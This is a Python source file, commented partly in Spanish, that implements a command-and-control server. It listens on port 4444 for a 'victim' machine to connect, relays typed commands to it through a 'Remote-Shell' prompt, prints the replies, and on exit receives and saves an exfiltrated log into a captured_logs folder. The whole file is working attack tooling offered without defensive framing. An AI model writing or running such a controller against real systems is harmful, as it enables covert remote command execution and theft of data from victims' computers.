import socket,os
import time

# '0.0.0.0' significa "Escuchar en todas las interfaces de red de este PC"
HOST = '0.0.0.0' 
PORT = 4444

def init_server():
    print(f"\n[+] Configurando el Servidor C2 en el puerto {PORT}...")

    base_path = os.path.dirname(os.path.abspath(__file__))
    path_proyect = os.path.dirname(base_path)
    dir_logs = os.path.join(path_proyect, "captured_logs")
    
    if not os.path.exists(dir_logs):
        os.makedirs(dir_logs)
        print(f"[*] Carpeta de logs creada en: {dir_logs}")


    # Create a TCP Socket
    #AF_INET specifies IPv4
    #SOCK_STREAM specifies TCP
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(1) # Listen for incoming connections (max 1 connection in the queue because of the argument number 1)
    print(f"[+] Servidor LISTO. Esperando a que la víctima se conecte...")

    client_sock, addr = server.accept() # Accept an incoming connection, is a blocking task, waits until someone connects
    # conn is the socket object to communicate with the client
    # addr is the address of the client
    print(f"\n[V] ¡CONEXIÓN ESTABLECIDA CON {addr[0]}!")
    print("-" * 50)

    while True:
        try:
            #SOlicitate command
        
            command = input("Remote-Shell >> ")
            #Sockets only send Bytes
            #encode tranforms the Strings into Byte
            if command.lower() == 'exit':
                print("[*] Enviando orden de cierre...")
                client_sock.send('exit'.encode())
                
                print("[*] Esperando exfiltración de datos...")
                try:
                    # Aumentamos el tiempo de espera por si el log es grande
                    data_log = client_sock.recv(20480).decode('utf-8', errors='ignore')
                    
                    if data_log:
                        file_name = f"log_{addr[0]}_{int(time.time())}.txt"
                        path_complete = os.path.join(dir_logs, file_name)
                        
                        with open(path_complete, "w", encoding="utf-8") as f:
                            f.write(data_log)
                        print(f"\n[+] ¡ÉXITO! Log guardado en:\n    >> {path_complete}")
                    else:
                        print("[-] El log llegó vacío.")
                        
                except Exception as e:
                    print(f"[-] Error recibiendo log: {e}")
                
                break
        
            if command.strip() == "":
                continue

            client_sock.send(command.encode())
            #Tranform the bytes into Utf-8 codification to understand in print
            response = client_sock.recv(4096).decode('utf-8',errors='ignore')

            print(response)
        
        except KeyboardInterrupt:
            print("\n[!] Cierre forzado detectado.")
            break
        except Exception as e:
            print(f"[-] Error en la conexión: {e}")
            break
        
    client_sock.close()
    server.close()
    print("[*] Servidor cerrado.")
    
if __name__ == '__main__':
    init_server()